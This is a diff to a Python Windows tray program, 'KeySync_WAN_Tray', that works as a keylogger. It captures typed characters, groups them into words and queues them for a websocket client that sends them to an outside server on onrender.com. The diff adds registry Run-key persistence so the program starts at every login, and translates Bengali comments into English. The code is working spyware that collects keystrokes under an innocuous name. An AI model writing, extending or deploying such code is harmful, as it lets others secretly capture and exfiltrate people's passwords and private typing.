@@ -7,6 +7,8 @@ from pystray import Icon, MenuItem, Menu
 from PIL import Image, ImageDraw
 import queue
 import sys
+import os
+import winreg
 
 # =========================
 # CONFIG
@@ -14,6 +16,45 @@ import sys
 URI = "wss://wan-data-t.onrender.com/ws"
 running = True
 message_queue = queue.Queue()
+
+# =========================
+# STARTUP REGISTRATION
+# =========================
+APP_NAME = "KeySync_WAN_Tray"
+REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+def register_startup():
+    """Register this app in the Windows Startup registry."""
+    try:
+        # frozen=True means we're running as a PyInstaller-built .exe
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        reg_value = f'"{exe_path}"'
+
+        # CreateKeyEx — creates the key if missing, otherwise opens it
+        key = winreg.CreateKeyEx(
+            winreg.HKEY_CURRENT_USER,
+            REG_PATH,
+            0,
+            winreg.KEY_READ | winreg.KEY_WRITE
+        )
+
+        # Check whether the same path is already registered
+        try:
+            current_val, _ = winreg.QueryValueEx(key, APP_NAME)
+            if current_val == reg_value:
+                winreg.CloseKey(key)
+                print("[Startup] Already registered, skipping.")
+                return
+        except FileNotFoundError:
+            pass  # Not registered yet
+
+        # Set/update the value (new entry or path changed)
+        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, reg_value)
+        winreg.CloseKey(key)
+        print(f"[Startup] Registered successfully: {exe_path}")
+
+    except Exception as e:
+        print(f"[Startup] Failed to register: {e}")
 
 # =========================
 # KEY CONVERTER
@@ -48,7 +89,7 @@ SPECIAL_KEYS = {
 def key_to_str(key):
     global ctrl_held, alt_held
 
-    # Modifier tracking — return None (buffer এ যাবে না)
+    # Modifier tracking — return None (do not add to buffer)
     if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
         ctrl_held = True
         return None
@@ -90,13 +131,13 @@ def on_press(key):
     if label is None:
         return  # pure modifier, skip
 
-    # Space → word flush, space নিজে send হবে না
+    # Space → flush word buffer (space itself is not sent)
     if key == keyboard.Key.space:
         if typed_buffer:
             message_queue.put(typed_buffer)
             typed_buffer = ""
 
-    # Printable character → buffer এ জমাও
+    # Printable character → append to buffer
     elif hasattr(key, 'char') and key.char is not None and not ctrl_held:
         typed_buffer += label
 
@@ -121,7 +162,7 @@ def on_release(key):
 def start_keyboard_listener():
     with keyboard.Listener(
         on_press=on_press,
-        on_release=on_release    # ← এটা আগে missing ছিল
+        on_release=on_release    # ← this was previously missing
     ) as listener:
         listener.join()
 
@@ -189,6 +230,9 @@ def start_tray():
 # MAIN
 # =========================
 if __name__ == "__main__":
+    # Register in Windows Startup
+    register_startup()
+
     threading.Thread(
         target=lambda: asyncio.run(websocket_client()),
         daemon=True
